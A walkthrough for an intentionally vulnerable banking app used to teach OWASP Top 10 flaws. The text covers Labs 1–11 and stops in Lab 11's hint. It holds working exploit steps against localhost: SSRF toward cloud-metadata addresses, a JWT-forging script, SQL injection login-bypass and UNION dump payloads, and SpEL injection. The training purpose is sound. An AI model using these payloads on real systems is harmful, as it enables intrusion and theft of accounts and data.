# SecureBank Labs — Walkthrough

> OWASP Top 10 · 25 Labs · Spring Boot 4 + PostgreSQL + React
>
> **This app is intentionally vulnerable.** It exists to be exploited and then
> fixed. Do not deploy it, do not put real data in it, do not point it at
> anything you care about. The database, the JWT secret and the seeded
> accounts are all lab fixtures.

---

## How to read this document

You are going to do three things, in this order:

1. **Build it** — get the project running on your machine.
2. **Run it** — start the database, the backend and the UI, and log in.
3. **Break it, then fix it** — for each of the 25 labs: follow the exploit
   steps, see what breaks, then read the hint and write the fix yourself.

Each lab section has the same shape:

| Part | What it gives you |
|---|---|
| **What it is** | The vulnerability in plain language. No jargon you have not met. |
| **Where it lives** | The exact file and method. Open it before you start. |
| **Exploit steps** | Numbered steps that reproduce the bug. Copy-pasteable. |
| **What you should see** | The evidence that the exploit worked. |
| **Why it matters** | The damage this allows in a real system. |
| **Hint** | Direction for the fix — **not** the fix itself. |

The hints deliberately stop short of the answer. There is a full fix
reference in [`solutions/SOLUTIONS.md`](solutions/SOLUTIONS.md) if you want
to compare afterwards — but read the hint first and try it yourself.

> **The one rule of this project**
>
> A lab is fixed by changing code, and by nothing else.
>
> There are no flags. Each lab's vulnerability lives in one method, on one
> code path, and that path is the only path — the vulnerable code is the
> shipped code, with no switch beside it. **Fixing a lab means replacing
> that code** with the correct version.
>
> That is what lets the verification harness assert on *behaviour* instead
> of on configuration: the same exploit succeeds before your fix and fails
> after it, with nothing but a code change in between.
>
> If you catch yourself looking for a switch to flip, you have not fixed
> anything.
>
> ### Two branches
>
> | Branch | What it is |
> | --- | --- |
> | `main` | The shipped **vulnerable** app. Every lab is exploitable. |
> | `fixed` | The same app with every lab fixed, one small commit per lab. |
>
> `git switch main` to work on the labs; `git switch fixed` to see what a
> complete set of fixes looks like. The commits on `fixed` are deliberately
> small — `lab-01 fixed`, `lab-02 fixed`, and so on — so you can read one
> lab's fix at a time, or cherry-pick a single one.

---

## Part 1 — Build it

### What you need

| Tool | Version | Notes |
|---|---|---|
| Java | 21 | `java -version` |
| Docker + Compose | any recent | Runs PostgreSQL only |
| Node.js + npm | Node 20+, npm 10+ | Runs the React dev server |
| Python | 3.10+ | Runs the verification harness |
| Maven | *not needed* | The repo ships `backend/mvnw` — the Maven wrapper |

Check them:

```bash
java -version
docker --version && docker compose version
node --version && npm --version
python3 --version
```

### Get the code and install dependencies

```bash
git clone <your-fork-or-this-repo>
cd securebank-labs

# Backend dependencies — the wrapper downloads Maven itself on first run.
cd backend && ./mvnw -q -o clean compile && cd ..
```

> The `-o` flag means "offline". The Maven cache in `~/.m2` already has
> every dependency. If you are on a fresh machine with an empty cache, drop
> `-o` once and let it download.

```bash
# Frontend dependencies
make ui-install
```

That is the whole build. There is no `npm run build` step you need — Vite
builds on the fly when you start the dev server.

### The repo layout

```
securebank-labs/
├── backend/         Spring Boot 4 + Maven          → http://localhost:8080
│   ├── pom.xml  mvnw  mvnw.cmd
│   ├── src/main/java/com/securebank/
│   │   ├── core/        AuthContext, PasswordHasher, error handling
│   │   ├── domain/      User, Account, Transfer + JPA repositories
│   │   ├── security/    SecurityConfig, LabAuthFilter, LabJwtService, JwtKeys
│   │   ├── labs/        a01/ a02/ a04/ a05/ a06/ a07/ a08/ a10/ — the 25 labs
│   │   └── ui/          HealthController, LabStateController
│   ├── src/main/resources/
│   │   ├── application.yml             the weakened settings (verbose errors, etc.)
│   │   ├── schema.sql  data.sql        idempotent schema and seed
│   │   └── static/                     the Lab 6 files: .env, git-config-fixture/, backup.zip
│   └── src/test/java/com/securebank/  seed-integrity and JWT lab tests
│
├── frontend/        React 18 + Tailwind + Vite    → http://localhost:5173
│
├── verify/          the verification harness       → python3 verify/run.py
├── scripts/         app.sh, isolation_matrix.py, gen_solutions.py, gen_labs_json.py, real_fixes.py, why.py
└── solutions/       the full fix reference          → solutions/SOLUTIONS.md
```

---

## Part 2 — Run it

There are **two servers**, and they talk to each other:

```
Browser ──► React dev server :5173 ──(proxies /api)──► Spring Boot :8080 ──► PostgreSQL :5432
```

The browser only ever talks to `:5173`. Vite forwards `/api`, `/uploads` and
`/admin-panel` to `:8080` behind the scenes, so there is no CORS setup and
no cross-origin weirdness.

### Step 1 — start the database

```bash
make up
```

This starts a PostgreSQL 16 container on `localhost:5432` and waits until it
answers. The schema and the seed data are applied on **every** boot, so the
database heals itself after you break it during a lab.

### Step 2 — start the backend

```bash
make run
```

Leave that running in its own shell. The app comes up on
`http://localhost:8080`. Check it:

```bash
curl http://localhost:8080/api/health
# {"status":"up"}
```

> **Prefer a background app?** `./scripts/app.sh start` runs it detached and
> logs to `/tmp/securebank-app.log`; `./scripts/app.sh stop` kills it and
> `./scripts/app.sh log` tails the output. `make run` is for when you want
> to see the stack traces as they happen — which you will, because you are
> about to deliberately cause them.

### Step 3 — start the frontend

```bash
make ui
```

Open **http://localhost:5173**.

### Step 4 — log in

| Username | Password | Role | Account |
|---|---|---|---|
| `admin` | `admin` | admin | — |
| `alice` | `password123` | customer | `ACC-1001` · £4,200 |
| `bob` | `qwerty` | customer | `ACC-1002` · £12,800 |
| `carol` | `letmein` | customer | `ACC-1003` · £950 |
| `dave` | `changeme` | customer | `ACC-1004` · £30,500 |

`admin` / `admin` works everywhere. That is Lab 5.

### Step 5 — confirm the starting state

```bash
make verify
```

All 25 labs must report `VULNERABLE`. If any report `INCONCLUSIVE`, the
harness and the app disagree about something — fix that first, or you will
be chasing a phantom later. (The usual cause: the backend was not actually
running, or the harness ran while the app was still starting.)

### The verification harness

```bash
python3 verify/run.py --list              # the catalogue
python3 verify/run.py --show 13           # title, OWASP, endpoints, fix location
python3 verify/run.py --lab 13            # run one check
python3 verify/run.py --all --expect vulnerable
python3 verify/run.py --all --expect fixed
```

> `--show` prints the lab's **metadata**: title, OWASP category, severity,
> endpoints, and the file and method to fix. It does
> **not** print the exploit steps or the hint — those live here, in this
> document, and in `solutions/SOLUTIONS.md` for the full fix.

Every check returns one of three verdicts:

| Verdict | Meaning |
|---|---|
| `VULNERABLE` | the exploit worked — the lab is live and unfixed |
| `FIXED` | the exploit was blocked — you fixed it |
| `INCONCLUSIVE` | something else happened |

`INCONCLUSIVE` never counts as a pass. It means the check could not be
made — the app was down, the endpoint answered with an unexpected status, or
the exploit's side effect was not observed. Read the detail line; it says
what happened.

### Resetting between labs

Exploiting a lab changes data. The **Reset** button in the navbar (or
`curl -X POST localhost:8080/api/lab/reset`) restores the seeded balances,
roles and password hashes, so an exploit in one lab does not leak into the
next.

The seed is also **self-healing**: `data.sql` runs on every boot and puts the
balances, roles and password hashes back. So if you are ever confused about
state, restart the app.

The harness also resets the seed itself before a **full** `--all` run, so
`make verify` always starts from the same state and always gives the same
answer. A single `--lab <id>` run does *not* reset — it leaves the database
exactly as it found it, so you can follow up on one lab without wiping the
evidence.

### Working on one lab at a time

```bash
# 1. read what the lab is
python3 verify/run.py --show 11

# 2. try the exploit by hand (curl, or the browser)
# 3. write the fix in the file the panel names
# 4. restart the backend, then check
python3 verify/run.py --lab 11
#    → expect FIXED
```

---

## Part 3 — The 25 labs

Each lab names one clearly-scoped location in the code. Open that file,
find the method, and read the Javadoc — it explains the flaw in the author's
own words.

### The lab index

| # | OWASP | Lab | Endpoint |
|---|-------|-----|----------|
| 1 | A01 | IDOR — read another customer's account | `GET /api/accounts/{id}` |
| 2 | A01 | Privilege escalation — customer reaches the admin API | `GET /api/admin/users` |
| 3 | A01 | SSRF — make the server fetch an internal URL | `POST /api/accounts/statement-email` |
| 4 | A02 | Debug mode — the stack trace leaks the JWT secret | `GET /api/debug/boom` |
| 5 | A02 | Default admin credentials | `POST /admin-panel/login` |
| 6 | A02 | Sensitive files on the web root | `GET /.env` |
| 7 | A04 | Unsalted MD5 password hashes | `GET /api/crypto/hashes` |
| 8 | A04 | Hardcoded JWT secret | any authenticated endpoint |
| 9 | A04 | PII in cleartext | `GET /api/crypto/profile` |
| 10 | A05 | SQL injection | `POST /api/auth/login` |
| 11 | A05 | SpEL injection | `POST /api/transfers/{id}/remark` |
| 12 | A05 | SSTI + OS command injection | `POST /api/report/generate`, `POST /api/report/date-filter` |
| 13 | A05 | Stored XSS | `POST /api/transfers/send` |
| 14 | A06 | Negative transfer — the amount is applied without validation | `POST /api/transfers/send` |
| 15 | A06 | Mass assignment | `PATCH /api/profile` |
| 16 | A06 | Account enumeration | `POST /api/auth/login` |
| 17 | A07 | Brute force — no lockout | `POST /api/auth/login` |
| 18 | A07 | Session fixation | `POST /api/auth/login-session` |
| 19 | A07 | Predictable reset token | `POST /api/auth/reset-request` |
| 20 | A08 | Unsafe deserialization → RCE | `POST /api/integrity/import-account` |
| 21 | A08 | JWT `alg:none` | any authenticated endpoint |
| 22 | A08 | Unrestricted file upload | `POST /api/integrity/kyc-upload` |
| 23 | A10 | Verbose error | `GET /api/transfers/account-summary?id=abc` |
| 24 | A10 | Type coercion leaks class names | `POST /api/transfers/typed-send` |
| 25 | A10 | Fail-open authentication | `POST /api/service/token` |

---

## A01 — Broken Access Control

*A01 is the "you checked who they are, but not what they are allowed to
touch" category. Every lab here is a case where the server correctly
identified the caller and then did something that caller had no business
doing.*

---

### Lab 1 — IDOR: read another customer's account `High`

**What it is.** IDOR means *Insecure Direct Object Reference*. When the app
keeps an account in a URL like `/api/accounts/2`, the number `2` is an
**object reference** — a pointer to a record in the database. If the server
only checks *who you are* ("you are alice") and never checks *whether this
account is yours*, then alice can simply change the number and read bob's
money. You did not break into bob's account. You asked for it politely, and
the server handed it over.

**Where it lives.**
`backend/src/main/java/com/securebank/labs/a01/AccountService.java` →
`getAccount(Long, Long)`

**Exploit steps.**

1. Log in as `alice / password123` and get a token:
   ```bash
   TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
     -H "Content-Type: application/json" \
     -d '{"username":"alice","password":"password123"}' \
     | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
   ```
2. Find alice's account ID. It is `1` (`ACC-1001`). You can also ask the
   API: `GET /api/accounts` with her token.
3. Read bob's account (ID `2`) using alice's token:
   ```bash
   curl -s http://localhost:8080/api/accounts/2 \
     -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
   ```
4. Change the number to `3`, `4`, `5`… it keeps working.

**What you should see.** `HTTP 200` with a body containing `ACC-1002`,
`12800.00`, and bob's details. No error, no warning.

**Why it matters.** In a real bank this is "customer A sees customer B's
balance, transactions and personal details" — a reportable data breach,
with no attacker skill required beyond editing a URL.

**Hint.** The service method receives *both* the account ID and the caller's
user ID. It currently uses only the first. What check would you add so that
a mismatch between the two becomes an error? Think about which comparison to
make, and what status code / exception the project already uses for "you
may not do that" — look for `AccountService.AccountForbiddenException`, which
`AccountController` already maps to `403`.

---

### Lab 2 — Privilege escalation: customer → admin `Critical`

**What it is.** The app has two kinds of user: **customers** and **admins**.
Some endpoints are for admins only — the admin API that lists every user in
the system. When the security configuration says "any logged-in user may
call this", a customer has become an admin simply by logging in. The
application has *roles*, but the check on this URL never looks at them.

**Where it lives.**
`backend/src/main/java/com/securebank/security/SecurityConfig.java` →
the matcher for `/api/admin/**` inside `apiChain()`

**Exploit steps.**

1. Log in as `alice / password123` and get her token (as in Lab 1).
2. Call the admin API with alice's token:
   ```bash
   curl -s http://localhost:8080/api/admin/users \
     -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
   ```
3. Also try `GET /api/admin/accounts`.

**What you should see.** `HTTP 200` and a list of every user in the system —
including their `password_hash` values. A customer is reading the admin
console.

**Why it matters.** This is the classic vertical privilege escalation. The
customer is not exploiting a bug in business logic; they are using a
perfectly ordinary feature that was left one word short of being safe.

**Hint.** Look at the request-matcher rules in the API chain. There are
several matchers, and one of them is missing the check that distinguishes a
customer from an admin. The rule you want expresses *"the caller must have
the ADMIN role"* rather than *"the caller must be logged in"*. Spring
Security has a method for exactly that — `hasRole("ADMIN")` — and the
comment sitting on the vulnerable matcher in `SecurityConfig` names it too.
Note also: the fix must not break Lab 5, which authenticates at a completely
different URL (`/admin-panel/login`).

---

### Lab 3 — SSRF: make the server fetch an internal URL `High`

**What it is.** SSRF means *Server-Side Request Forgery*. Normally **you**
ask your browser to fetch a URL, and the browser asks the server. But this
app has a feature: "email my statement to a callback URL". The **server**
fetches that URL and even returns the response body to you.

That inverts the security model. Your machine cannot reach
`169.254.169.254` (the cloud metadata address) or the database's private
address — but the *server* can. So you tell the server to fetch it, and the
server hands you the answer. The server becomes your proxy into its own
network.

**Where it lives.**
`backend/src/main/java/com/securebank/labs/a01/SsrfStatementService.java` →
`sendStatement(Long, String)`

**Exploit steps.**

1. Get alice's token (as in Lab 1).
2. Point the callback at an address only the server can reach:
   ```bash
   curl -s -X POST http://localhost:8080/api/accounts/statement-email \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"account_id":1,"callback_url":"http://127.0.0.1:8080/api/health"}' \
     | python3 -m json.tool
   ```
3. Try the other internal targets:
   ```bash
   for u in "http://169.254.169.254/latest/meta-data/" "http://10.0.0.1/" "http://localhost:8080/api/debug/boom"; do
     curl -s -X POST http://localhost:8080/api/accounts/statement-email \
       -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
       -d "{\"account_id\":1,\"callback_url\":\"$u\"}" | python3 -m json.tool
   done
   ```

**What you should see.** `"status": "sent"` plus `callback_body` and
`callback_status` — the server's own answer to itself, handed back to you.
The `/api/debug/boom` target is the most dramatic: it returns the leaked
JWT secret from inside the server's own network position.

> `http://127.0.0.1:8080/api/health` and `http://localhost:8080/api/debug/boom`
> both answer immediately. The `http://10.0.0.1/` target is a *private*
> address that nothing is listening on here, so it will **hang and then
> time out** — that is the network behaving correctly, not a failed
> exploit. The loopback targets are the ones that demonstrate the point.

**Why it matters.** In cloud deployments the metadata endpoint hands out
credentials for the whole environment. SSRF is how an internet-facing app
becomes a pivot into the private network.

**Hint.** The service already has a method for deciding whether a URL is
allowed — look for `isAllowedCallback`. The bug is that nobody calls it
before the fetch happens. Ask yourself: where exactly in the method should
that check go, and what should the response look like when it fails? The
service is also part of the SSRF lab, so the fix goes *inside* the
method.

---

## A02 — Security Misconfiguration

*A02 is about the settings and defaults you ship without thinking. Nothing
here needs a clever payload — the app is just configured to be open.*

---

### Lab 4 — Debug mode: the stack trace leaks the JWT secret `Low`

**What it is.** When an application throws an unexpected exception, the
"friendly" thing to do is show the user a stack trace. It is extremely
helpful in development and dangerous in production, because a stack trace
tells an attacker your framework versions, your package names, your file
paths — and if the exception *message* embeds a secret, it hands over the
secret directly.

**Where it lives.**
`backend/src/main/java/com/securebank/labs/a02/DebugLeakController.java` →
`boom(String)`, **plus** `backend/src/main/resources/application.yml`
(the `server.error.include-*` settings).

**Exploit steps.**

1. Request the debug endpoint:
   ```bash
   curl -s "http://localhost:8080/api/debug/boom?detail=probe" | head -40
   ```
2. Read the response looking for the strings `hardcoded-jwt-secret`,
   `jdbc:postgresql`, `db password`, `securebank`.

**What you should see.** `HTTP 500` and a JSON body containing the JWT
signing secret, the database JDBC URL and the database password, plus a
full stack trace.

**Why it matters.** The leaked JWT secret alone lets you forge an admin
token — that is Lab 8, one click away. A stack trace is a map of the
application's internals handed to whoever asks.

**Hint.** There are **two** halves to this fix, and you need both:

1. The exception *message* itself embeds the secrets. What should that
   message say instead? (A message that is safe to show a stranger.)
2. `application.yml` sets `server.error.include-stacktrace`,
   `include-message` and `include-exception` to `always`. What should those
   be set to in production?

Look at how `ApiExceptionHandler` in `core/` handles exceptions elsewhere in
the app — there may already be a pattern to copy.

---

### Lab 5 — Default admin credentials `Low`

**What it is.** This app ships with an admin account whose username and
password are both `admin`. The admin console at `/admin-panel/` accepts it.
Default credentials are dangerous precisely because they are *public* — the
README, the source code, and every copy of this lab list them.

**Where it lives.**
`backend/src/main/java/com/securebank/labs/a02/AdminPanelController.java` →
`login(Map)`

**Exploit steps.**

```bash
curl -s -X POST http://localhost:8080/admin-panel/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}' | python3 -m json.tool
```

**What you should see.** `HTTP 200` with `"authenticated": true` and an
admin session token.

**Why it matters.** It is the shortest possible route to total compromise.
No exploit, no tool, no knowledge required — just the credentials printed in
the documentation.

**Hint.** Two halves again, and the lab does not flip to `FIXED` until
**both** are done:

1. The code compares the submitted username and password against a
   hardcoded literal. Instead, what should it do? Look at how the *other*
   login endpoint (`/api/auth/login`) authenticates a user — that method
   looks somebody up and compares a hash. The admin panel should do the
   same thing.
2. The admin row in `backend/src/main/resources/data.sql` still stores the
   MD5 hash of `admin`. Rotating the *code* is not enough while the
   *database* still holds the default password. What has to change there?

> **Why does this matter for Lab 7?** If you fix Lab 7 first (switching to
> BCrypt), the seeded hashes change format. Lab 5's fix should be written so
> it does not depend on the hash algorithm — it should ask "does the stored
> hash match what was submitted?" and nothing more.

---

### Lab 6 — Sensitive files on the web root `Medium`

**What it is.** Any file inside the web root is a URL. If a developer drops
a `.env` file, a `.git` directory, or a backup archive into the folder that
gets served, the internet can download them. These files routinely contain
database passwords, API keys, and — in `.git/config` — the address of your
source repository.

**Where it lives.**
`backend/src/main/resources/static/` — the three artefacts are there:
`.env`, `git-config-fixture/`, `backup.zip`.
(Also `backend/src/main/java/com/securebank/labs/a02/SensitiveFileController.java`.)

**Exploit steps.**

```bash
curl -s http://localhost:8080/.env
curl -s http://localhost:8080/.git/config
curl -s -o /tmp/backup.zip http://localhost:8080/backup.zip && \
  python3 -c "import zipfile;print(zipfile.ZipFile('/tmp/backup.zip').namelist())"
```

**What you should see.** All three return `HTTP 200` with their contents.
The `.env` has `AWS_ACCESS_KEY_ID`, `STRIPE_SECRET_KEY` and `JWT_SECRET` in
it. The `backup.zip` contains a database dump — including password hashes.

**Why it matters.** One leaked `.env` file is one leaked production
incident, and it does not require any vulnerability at all. It requires
only that somebody dragged-and-dropped a file into the wrong folder.

**Hint.** There is no code fix here — this lab is a **file move**. Where do
these files actually belong? Consider a directory that is *not* under the
served root, and is not on the classpath either.

Two practical notes:

- Git will not track the contents of a nested `.git` directory (it treats it
  as a submodule boundary), so the source tree names the fixture
  `git-config-fixture/` and the build's `<resource>` block in
  `backend/pom.xml` maps it back to `static/.git` on the way in. If you move
  the fixture, move `git-config-fixture/`.
- The harness judges this lab on the **absence of content**, not on a
  particular status code. A moved file may surface as `404`, or as a `500`
  if the resource handler throws while rendering the error page. All of
  those count as fixed.

---

## A04 — Cryptographic Failures

*A04 is about using the wrong tool, or using the right tool with the wrong
inputs. "I hashed the password" is not the same as "I hashed the password
safely".*

---

### Lab 7 — Unsalted MD5 password hashes `Medium`

**What it is.** MD5 was designed to be fast — that is what makes it good at
checksums and terrible at passwords. A fast hash means an attacker who
steals the database can try billions of guesses per second. And "unsalted"
means every copy of the same password produces the same hash, so one
precomputed table (a *rainbow table*) cracks every user at once.

MD5 is so fast that this lab's passwords are already in well-known lookup
tables. You do not need a cracker — you need `md5sum`.

**Where it lives.**
`backend/src/main/java/com/securebank/core/Md5Hasher.java` **and**
`backend/src/main/resources/data.sql` (the stored hash values).

**Exploit steps.**

1. Read the hashes:
   ```bash
   TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
     -H "Content-Type: application/json" \
     -d '{"username":"alice","password":"password123"}' \
     | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

   curl -s http://localhost:8080/api/crypto/hashes \
     -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
   ```
2. Crack one:
   ```bash
   printf 'password123' | md5sum
   # 482c811da5d5b4bc6d497ffa98491e38   ← matches alice's stored hash
   ```
   The other seeded ones are just as quick:
   | Password | MD5 |
   |---|---|
   | `qwerty` | `d8578edf8458ce06fbc5bb76a58c5ca4` |
   | `admin` | `21232f297a57a5a743894a0e4a801fc3` |
3. Log in as bob with the *cracked* password — it is the same password you
   already knew, but now you know it took zero effort to obtain from the
   database.

**What you should see.** `HTTP 200` and a JSON array where every user's
`password_hash` is a bare 32-character MD5 hex digest — no salt, no
algorithm marker, no work factor.

**Why it matters.** A leaked database becomes a leaked user list. The
question is never "will the database leak" but "how long until it does".

**Hint.** Two questions, in order:

1. **Which algorithm?** MD5 and SHA-256 are both *fast* and both wrong for
   passwords. What you want is an algorithm that is deliberately *slow* and
   *memory-hard*: BCrypt, Argon2, scrypt, or PBKDF2. Spring Security ships
   BCrypt and PBKDF2 encoders already — look at how `PasswordHasher` in
   `core/` is structured and what it already depends on.
2. **The salt.** A per-user random salt means two users with the same
   password get different hashes, so one rainbow table cracks nobody. Where
   would that salt live, and how would it be stored alongside the hash?

You will also need to **re-hash the seeded rows**. The hashes are in
`data.sql` as literals. What does a fixed seed look like — and remember the
`ON CONFLICT ... DO UPDATE` clause is what makes the seed overwrite whatever
your exploit changed.

> **Careful with Lab 5 and Lab 10.** These three labs touch the same
> password machinery:
> - Lab 5 wants the admin's *password* changed.
> - Lab 10 wants the *query* changed.
> - Lab 7 wants the *algorithm* changed.
>
> Keep them separate and each stays fixed when you fix the others.

---

### Lab 8 — Hardcoded JWT secret `Medium`

**What it is.** The API uses **JWTs** (JSON Web Tokens) so the browser can
prove who it is without the server keeping a session. A JWT is
`header.payload.signature`. The signature is produced with a **secret key**.
If that secret lives in the source code, everyone who has ever read the
repository — including you, right now — can sign their own tokens.

Signing a token for yourself with `role: admin` is called *forging*. It
looks like a legitimate admin session, because it is byte-for-byte what a
legitimate admin session looks like.

**Where it lives.**
`backend/src/main/java/com/securebank/security/JwtKeys.java` →
`secret()`

**Exploit steps.**

1. Read the secret out of the source (or the startup log — the app prints
   it):
   ```bash
   grep -n "HARDCODED_SECRET =" backend/src/main/java/com/securebank/security/JwtKeys.java
   ```
   The secret is `hardcoded-jwt-secret-do-not-ship-2024`.
2. Forge an admin token:
   ```bash
   FORGED=$(python3 - <<'PY'
   import base64, hmac, hashlib, json
   def b64(raw): return base64.urlsafe_b64encode(raw).decode().rstrip("=")
   secret = b"hardcoded-jwt-secret-do-not-ship-2024"
   head = {"alg":"HS256","typ":"JWT"}
   pay  = {"user_id":1,"username":"admin","role":"admin"}
   s = f"{b64(json.dumps(head,separators=(',',':')).encode())}.{b64(json.dumps(pay,separators=(',',':')).encode())}"
   print(f"{s}.{b64(hmac.new(secret, s.encode(), hashlib.sha256).digest())}")
   PY
   )
   ```
3. Use it:
   ```bash
   curl -s http://localhost:8080/api/admin/users -H "Authorization: Bearer $FORGED" \
     | python3 -m json.tool
   ```

**What you should see.** `HTTP 200` with the full user list. The token was
never issued by the server and it still worked.

**Why it matters.** A hardcoded secret is not a secret. It is in version
control, in every clone, in every backup of the repository. Rotating it
later does not help, because the old one is still out there.

**Hint.** The class already tells you the shape of the answer:

1. The secret must come from **outside the source tree** — an environment
   variable or a secret manager. The class even names the variable it
   wants: look for `SECRET_ENV_VAR`. What happens when that variable is not
   set? (Think about whether falling back to a guessable value is
   acceptable, and what a real deployment should do instead — fail to
   start.)
2. The secret must be **rotated to something random**. What would you
   generate, and with what?
3. The secret must **not be logged**. There is a `logSecretAtStartup` method
   that prints it. What should that method do instead?
4. When you change it, the app needs a way to still boot for other people.
   The `fallbackSecret` field is there for that — is it random enough?

---

### Lab 9 — PII in cleartext `Low`

**What it is.** PII is *Personally Identifiable Information*: a full name, an
email address, a phone number, a national ID, a sort code. Some of it is
genuinely needed by the person it belongs to and nobody else.

This endpoint returns the caller's profile **unmasked** — and it logs it
too, in the clear, at `INFO` level.

**Where it lives.**
`backend/src/main/java/com/securebank/labs/a04/CryptoLeakController.java` →
`profile()`

**Exploit steps.**

1. Read alice's own profile:
   ```bash
   curl -s http://localhost:8080/api/crypto/profile \
     -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
   ```
2. Look for `Alice Anderson`, `alice@bank.com`, `ACC-1001`, `20-00-00`.
3. Also check the app's log output — the profile is written to the log in
   the clear too.

**What you should see.** Every field present, in full, in the response body.

**Why it matters.** Masking is not cosmetic. A response that contains the
full account number and sort code is a response that will end up in a
browser history, a proxy log, a support ticket, and a screenshot. Masking
at the boundary means each consumer sees only what it needs.

**Hint.** Two places to look at:

1. **The response.** What is the *minimum* this endpoint needs to return?
   Consider which fields the customer genuinely needs to see and which ones
   should be reduced — a sort code might become `20-00-**`, an account
   number might be shown only in groups of four. Java has helpers for this
   in `java.util` and `java.text` — look for something that masks the
   middle of a string.
2. **The log.** What is the point of logging a customer's full details at
   `INFO`? What should the log line contain instead?

---

## A05 — Injection

*A05 is the "your data became my code" category. Every lab here has the
same shape: a value the user controls ends up somewhere it should only ever
have been treated as **data**, and something downstream treats it as
**code** — a SQL statement, an expression, a shell command, an HTML page.*

*The mental model to carry through all four labs: **where did my string end
up?** If the answer is "inside something that gets parsed or executed", that
is the bug.*

---

### Lab 10 — SQL injection: bypass the login and dump the users table `High`

**What it is.** The login endpoint looks a user up with a SQL query. If the
username is pasted *into* the query text rather than passed as a **value**,
then the username is not a value — it is part of the statement, and the
database will do whatever it is told.

SQL has a comment marker, `--`. Everything after it on that line is thrown
away. So a username of `admin' --` turns

```sql
SELECT ... FROM users WHERE username = 'admin' --' AND password_hash = '...'
```

into

```sql
SELECT ... FROM users WHERE username = 'admin'
```

The password check is gone. You are now admin, and you did not guess a
password.

**Where it lives.**
`backend/src/main/java/com/securebank/labs/a05/RawSqlUserLookup.java` and
`backend/src/main/java/com/securebank/labs/a05/InjectionController.java`
(the `/api/transfers/search` endpoint).

**Exploit steps — part 1: the login bypass.**

```bash
curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' --","password":"anything"}' | python3 -m json.tool
```

You get a token for `admin` with `"role": "admin"`, using a password of
`anything`.

**Exploit steps — part 2: the data dump.**

```bash
curl -s -G http://localhost:8080/api/transfers/search \
  -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "q=' UNION SELECT id, id, id, 0, username || ' | ' || password_hash, role FROM users--" \
  | python3 -m json.tool
```

The rows that come back are not all transfers. At the end of the list are
the `users` table, with password hashes.

> **Why that payload looks like that.** The vulnerable query is
> ```sql
> SELECT id, from_account_id, to_account_id, amount, note, status
> FROM transfers WHERE note LIKE '%<your input>%'
> ```
> A `UNION` requires **the same number of columns, in the same order, with
> compatible types**. So the injected branch must supply exactly six
> values, and the six columns you get back are named after the *transfers*
> table — `id`, `from_account_id`, `to_account_id`, `amount`, `note`,
> `status` — no matter what you actually selected.
>
> That is why the payload puts `username` and `password_hash` into the
> `note` slot (joined with ` | `, since `note` is `TEXT` and the others are
> `VARCHAR`), uses `role` for `status`, and repeats `id` for the two
> `BIGINT` account columns and `0` for the `NUMERIC` amount.
>
> If you try the "obvious" seven-column version
> (`SELECT id, username, password_hash, email, full_name, role, created_at FROM users--`)
> you get `HTTP 500` — *"each UNION query must have the same number of
> columns"*. That is Postgres, not the lab failing.

**What you should see.** A `200` login response naming `admin`, and a
transfer list whose **last five rows** are the seeded users. Each of those
rows carries the username and the MD5 hash in its `note` field, and the
role in its `status` field:

```json
{"id": 1, "from_account_id": 1, "to_account_id": 1, "amount": 0,
 "note": "alice | 482c811da5d5b4bc6d497ffa98491e38", "status": "customer"}
{"id": 1, "from_account_id": 1, "to_account_id": 1, "amount": 0,
 "note": "admin | 21232f297a57a5a743894a0e4a801fc3", "status": "admin"}
```

Those hashes are the ones Lab 7 cracks in one `md5sum`.

**Why it matters.** SQL injection is the classic "read the whole database"
bug. It is also usually the gateway to much worse things once an attacker
realises the database account can write.

**Hint.** The fix is not "escape the quotes" — escaping is a blacklist, and
blacklists lose. The fix is **parameterised queries**: the SQL text is
fixed and written by you, and the user's data is sent separately as a
value that the driver escapes for you.

Look at the `UserRepository` in `domain/repo/` — JPA's `findByUsername`
already does exactly this. So the question is: what should the login
endpoint call instead of the raw-SQL helper, and what should happen to the
"does the user exist" and "is the password right" checks once the query is
safe?

The same question has a second half: the *search* endpoint is injectable
too, and its fix is the parameterized query already sitting directly below
the vulnerable branch in `InjectionController.search(...)`. Delete the
vulnerable branch and call that one.

> **Careful with Lab 7.** The password check currently happens *in Java*,
> not in SQL. That is deliberate — it keeps Lab 7 (hashing) and Lab 10
> (injection) independent, so fixing one does not un-fix the other.

---

### Lab 11 — SpEL injection: the remark is evaluated as an expression `High`

**What it is.** SpEL is **Spring Expression Language** — Spring's built-in
little language for computing values, used in `@Value` annotations and
config files. It can do arithmetic, call methods, and reach into the running
application.

This endpoint renders a transaction "remark" by handing the user's text
**straight to the expression parser**. So the user's text is not a remark;
it is a program. This is the Spring equivalent of Jinja2's
`render_template_string(f"...")` — the same mistake, in a different
framework: **data was interpolated into a template before parsing**.

**Where it lives.**
`backend/src/main/java/com/securebank/labs/a05/SstiRemarkController.java` →
`remark(Long, Map)`

**Exploit steps.**

1. Log in as alice and get her token.
2. Send a remark that is just an expression:
   ```bash
   curl -s -X POST http://localhost:8080/api/transfers/1/remark \
     -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
     -d '{"remark":"7*7"}' | python3 -m json.tool
   ```
3. Read the `rendered` field.

**What you should see.** `"rendered": "49"`. The server *computed* your
remark.

> **A trap worth knowing about.** You might try `#{7*7}` first, because
> that is the SpEL syntax you see in `@Value("${...}")`. It does **not**
> work here. `#{...}` is *template* syntax; `parseExpression()` takes a
> **bare** expression. `7*7` is the payload.
>
> And note the escalation path: because the parser can call methods, a bare
> expression can reach `java.lang.Runtime` and run commands. The lab only
> checks `7*7` because that is enough to prove the point — but treat the
> endpoint as remote code execution until you have fixed it.

**Why it matters.** The remark field is written by ordinary customers and
read by bank staff. A remark that is *code* runs with the bank's
permissions.

**Hint.** The problem is not "SpEL" — it is that the **template is not
constant**.

Ask yourself:

- Which string in this method should be a *fixed template* that the
  developer wrote, and which string should be a *variable* that the caller
  controls?
